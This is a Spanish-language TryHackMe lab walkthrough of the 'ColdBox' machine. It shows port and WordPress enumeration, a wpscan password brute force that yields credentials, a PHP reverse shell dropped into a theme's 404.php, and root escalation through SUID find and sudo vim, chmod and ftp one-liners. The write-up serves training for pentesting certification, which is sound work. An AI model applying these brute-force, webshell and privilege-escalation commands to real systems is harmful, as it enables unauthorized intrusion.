# ColdBox

> 🧠 **Plataforma:** TryHackMe
>
> 💻 **Sistema operativo:** Linux
>
> 🎯 **Nivel:** Easy
>
> ✅ **Estado:** Done
>
> 📘 **Curso eJPT:** yes
>
> 🗓️ **Fecha de creación:** 30 de diciembre de 2024 15:45
>
> 🌐 **IP:** `10.10.134.48`

---


## Recopilación de información

<aside>
💡 Enumeración inicial

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.10.134.48 -oG allports
```

![image.png](<imagenes/image 24.png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

- **Identificación de vulnerabilidades**
  - Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  - 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)

    ```bash
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: ColddBox | One more machine
    |_http-generator: WordPress 4.1.31
    ```

  - 4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

- **Enumeración web**

    ```bash
    whatweb 10.10.134.48
    
    http://10.10.134.48 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.134.48], JQuery[1.11.1], MetaGenerator[WordPress 4.1.31], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[ColddBox | One more machine], WordPress[4.1.31], x-pingback[/xmlrpc.php]
    ```

    **WordPress 4.1.31**

    ![image.png](<imagenes/image 25.png>)

Hacemos fuzzing para ver si encontramos directorios :

```bash
❯ gobuster dir -u http://10.10.134.48/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![image.png](<imagenes/image 26.png>)

En el panel /hidden enontramos posibles usuarios :

![image.png](<imagenes/image 27.png>)

Users: C0ldd, Hugo, Philip

Encontramos un WordPress:

![image.png](<imagenes/image 28.png>)

Enumeramos el WordPress con WPScan:

```bash
 wpscan --url http://10.10.134.48 -P /usr/share/wordlists/rockyou.txt
 
 +] URL: http://10.10.134.48/ [10.10.134.48]
[+] Started: Mon Dec 30 16:07:22 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.134.48/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.134.48/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.134.48/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.134.48/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.134.48/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.134.48/wp-content/themes/twentyfifteen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://10.10.134.48/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://10.10.134.48/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.134.48/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <==========================================================================================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===========================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

  [+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 9876543210                    
 
```

Accedemos al panel con usuario c0ldd

## Explotación

<aside>
💡 Explotaremos un WordPress

</aside>

### Explotación 1

Una vez autenticados con un usuario, probaremos a editar un plugin con una revershell :

![image.png](<imagenes/image 29.png>)

Editamos el tema “Twenttyfifteen” , el archivo 404.php, con una revershell en php.

La ejecutamos con la ruta:  

<http://10.10.112.7/wp-content/themes/twentyfifteen/404.php>

Obtenemos la revershell

Hacemos tratamiento de la tty

```bash
script -c bash /dev/null
cntr+z
stty raw -echo; fg
reset term
export TERM=XTERM
export SHELL=BASH
```

### Explotación 2

### Explotación 3

## Explotación posterior

<aside>
💡

</aside>

### Escalada de privilegios 1

Una vez dentro, con usuario www-data buscamos binarios con SUID

```bash
find / -u=s -type f 2>/dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-
```

Encontramos el binario “find”

Buscamos GTFObins

```bash
./find . -exec /bin/sh -p \; -quit
```

Ejecutamos en la maquina y obtenemos root

###

### Escalada de privilegios 2

Podemos revisar dentro del fichero wp-config.php y encontramsos credenciales para el usuario c0ldd

```bash
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

```

Usuario: c0ldd

Password: cybersecurity

Nos convertimos en usuario c0ldd

Buscamos SUID con sudo -l :

```bash
sudo -l 
El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

Buscamos con GTF Obins:

vim

```bash
sudo vim -c ':!/bin/sh'
```

Ejecutamos en la maquina y obtenemos root

chmo

```bash
LFILE=file_to_change 
sudo chmod 6777 $LFILE

LFILE=/bin/sh
sudo chmod 6777 $LFILE
```

ftp

```bash
sudo ftp
!/bin/sh
```

## Conclusión

💡 Maquina facil que se puede escalar privilegios de diferentes maneras
